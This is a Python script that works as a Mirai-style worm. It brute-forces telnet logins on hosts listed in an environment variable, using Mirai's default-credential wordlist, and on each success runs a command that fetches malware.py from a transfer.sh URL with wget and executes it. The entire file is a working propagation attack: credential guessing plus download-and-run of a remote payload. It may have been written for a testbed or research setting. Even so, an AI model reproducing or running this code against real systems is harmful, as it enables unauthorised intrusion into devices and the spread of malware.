#!/usr/bin/python3
import datetime
import threading
import xtelnet

from environs import Env

env = Env()
env.read_env()

MALWARE_URL = "http://transfer.sh/b2A0p/malware.py"

# Mirai wordlist
wordlist = [('root', 'xc3511'), ('admin', 'admin'), ('root', 'vizxv'), ('root', 'admin'), ('root', '888888'), ('root', 'xmhdipc'), ('admin', 'admin'), ('root', 'default'), ('admin', 'admin'), ('root', 'jauntech'), ('root', '123456'), ('root', '54321'), ('support', 'support'), ('root', ''), ('admin', 'password'), ('root', 'root'), ('root', '12345'), ('user', 'user'), ('admin', ''), ('root', 'pass'), ('admin', 'admin1234'), ('root', '1111'), ('admin', 'smcadmin'), ('admin', '1111'), ('root', '666666'), ('root', 'password'), ('root', '1234'), ('root', 'klv123'), ('Administrator', 'admin'), ('service', 'service'), ('supervisor', 'supervisor'), ('guest', 'guest'), ('guest', '12345'), ('admin1', 'password'), ('administrator', '1234'), ('666666', '666666'), ('888888', '888888'), ('ubnt', 'ubnt'), ('root', 'klv1234'), ('root', 'Zte521'), ('root', 'hi3518'), ('root', 'jvbzd'), ('root', 'anko'), ('root', 'zlxx.'), ('root', '7ujMko0vizxv'), ('root', '7ujMko0admin'), ('root', 'system'), ('root', 'ikwb'), ('root', 'dreambox'), ('root', 'user'), ('root', 'realtek'), ('root', '000000'), ('admin', '1111111'), ('admin', '1234'), ('admin', '12345'), ('admin', '54321'), ('admin', '123456'), ('admin', '7ujMko0admin'), ('admin', 'pass'), ('admin', 'meinsm'), ('tech', 'tech'), ('mother', 'fucker')]

def get_hosts():
    hosts = env("CORE_PEER_NEIGHBORS")
    hosts = hosts.split(",")
    return hosts

def check_login(host: str):
    now = datetime.datetime.now()
    for comb in wordlist:
        try:
            t = xtelnet.session()
            t.connect(host, username=comb[0],password=comb[1],p=23,timeout=1)
            command = 'echo "pwned" > pwned.mal && wget ' + MALWARE_URL + ' && python3 malware.py &'
            output = t.execute(command)
            print(host + " pwned " + output)
            t.close()
            break
        except Exception:
            print(host + " not pwned")
            pass
    print("bruteforcing host", host , "took ", datetime.datetime.now() - now)

def brute_force(hosts: list):
    for host in hosts:
        t = threading.Thread(target=check_login, args=(host,))
        t.start()

def main():
    hosts = get_hosts()
    brute_force(hosts=hosts)

if __name__ == "__main__":
    main()